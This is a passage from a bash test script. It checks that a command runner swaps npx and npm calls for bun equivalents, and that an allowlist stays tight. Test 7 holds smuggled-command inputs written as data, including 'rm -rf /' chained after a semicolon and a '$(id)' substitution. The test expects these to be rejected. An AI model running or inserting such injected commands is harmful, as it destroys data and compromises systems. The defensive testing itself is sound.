echo "      Tests  3 passed (3)"
EOF
chmod +x "$TMP/bin/bun"
NOBUNX=""
OLDIFS="$IFS"; IFS=:
for d in $PATH; do
  [ -x "$d/bunx" ] && continue
  NOBUNX="${NOBUNX:+$NOBUNX:}$d"
done
IFS="$OLDIFS"
printf 'npx vitest run x.test.ts\n' > "$TMP/cmds"
RESULT="$(cd "$TMP" && export PATH="$TMP/bin:$NOBUNX" RST_NPX_BIN=npx-absent-xyz && rst_run_commands ./cmds ./log)"
assert_eq "Test5b: rst_run_commands prints 0 3 3" "0 3 3" "$RESULT"
assert_eq "Test5b: bun stub recorded 'x' + rest of argv (bun x fallback)" "x vitest run x.test.ts" "$(cat "$TMP/bun-x-argv")"
assert_contains "Test5b: bun x translation line logged" "rst_run_commands: npx not found, running as: bun x vitest run x.test.ts" "$(cat "$TMP/log")"
rm -rf "$TMP"

# Test 6: npm test -> bun run test when npm absent; real npx is left alone
TMP="$(mktemp -d)"
mkdir -p "$TMP/bin"
cat > "$TMP/bin/bun" <<EOF
#!/usr/bin/env bash
echo "\$*" > "$TMP/bun-argv"
echo "      Tests  2 passed (2)"
EOF
chmod +x "$TMP/bin/bun"
printf 'npm test\n' > "$TMP/cmds"
RESULT="$(cd "$TMP" && export PATH="$TMP/bin:$PATH" RST_NPM_BIN=npm-absent-xyz && rst_run_commands ./cmds ./log)"
assert_eq "Test6: npm counts 0 2 2" "0 2 2" "$RESULT"
assert_eq "Test6: bun stub recorded 'run test'" "run test" "$(cat "$TMP/bun-argv")"
# npm run <script> <args> -> bun run <script> <args> (the elif "run" branch, which
# Test 6's `npm test` case never exercises). Script name + trailing positional args
# must survive the argv[0] swap verbatim.
printf 'npm run lint:fix src\n' > "$TMP/cmds-run"
RESULT_RUN="$(cd "$TMP" && export PATH="$TMP/bin:$PATH" RST_NPM_BIN=npm-absent-xyz && rst_run_commands ./cmds-run ./log-run)"
assert_eq "Test6: npm run counts 0 2 2" "0 2 2" "$RESULT_RUN"
assert_eq "Test6: bun stub recorded 'run lint:fix src'" "run lint:fix src" "$(cat "$TMP/bun-argv")"
assert_contains "Test6: npm run translation line logged" "rst_run_commands: npm not found, running as: bun run lint:fix src" "$(cat "$TMP/log-run")"
cat > "$TMP/bin/npx" <<EOF
#!/usr/bin/env bash
echo "\$*" > "$TMP/npx-argv"
echo "      Tests  1 passed (1)"
EOF
chmod +x "$TMP/bin/npx"
printf 'npx vitest run y.test.ts\n' > "$TMP/cmds2"
RESULT2="$(cd "$TMP" && export PATH="$TMP/bin:$PATH" && rst_run_commands ./cmds2 ./log2)"
assert_eq "Test6: npx counts 0 1 1 (real npx runs)" "0 1 1" "$RESULT2"
assert_eq "Test6: real npx stub recorded argv (not bunx)" "vitest run y.test.ts" "$(cat "$TMP/npx-argv")"
assert_eq "Test6: no npx translation line when npx exists" "" "$(grep -F 'npx not found' "$TMP/log2" || true)"
rm -rf "$TMP"

# Test 7: the allowlist is not widened by the translation
for c in \
  "npx vitest run x.test.ts; rm -rf /" \
  'npx vitest run $(id)' \
  "npm install" \
  "bunx -e 'x'"; do
  if rst_command_looks_runnable "$c"; then FAIL=$((FAIL+1)); echo "FAIL: Test7 must reject: $c"; else PASS=$((PASS+1)); echo "PASS: Test7 rejected: $c"; fi
done
TMP="$(mktemp -d)"
mkdir -p "$TMP/bin"
cat > "$TMP/bin/bunx" <<EOF
#!/usr/bin/env bash
echo invoked > "$TMP/bunx-invoked"
EOF
chmod +x "$TMP/bin/bunx"
printf '%s\n' 'npx vitest run x.test.ts; rm -rf /' > "$TMP/cmds"
RESULT="$(cd "$TMP" && export PATH="$TMP/bin:$PATH" RST_NPX_BIN=npx-absent-xyz && rst_run_commands ./cmds ./log)"
assert_contains "Test7: refuses non-runnable command" "rst_run_commands: refusing non-runnable command" "$(cat "$TMP/log")"
assert_eq "Test7: no stub invoked for refused command" "no" "$([ -f "$TMP/bunx-invoked" ] && echo yes || echo no)"
rm -rf "$TMP"

echo "--- rst_parse_counts: vitest plain all-pass summary (Test 8) ---"
assert_eq "Test8: vitest 'Tests  12 passed (12)'" "12 12" "$(printf '      Tests  12 passed (12)\n' | rst_parse_counts)"

echo
echo "run-stop-tests.sh: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
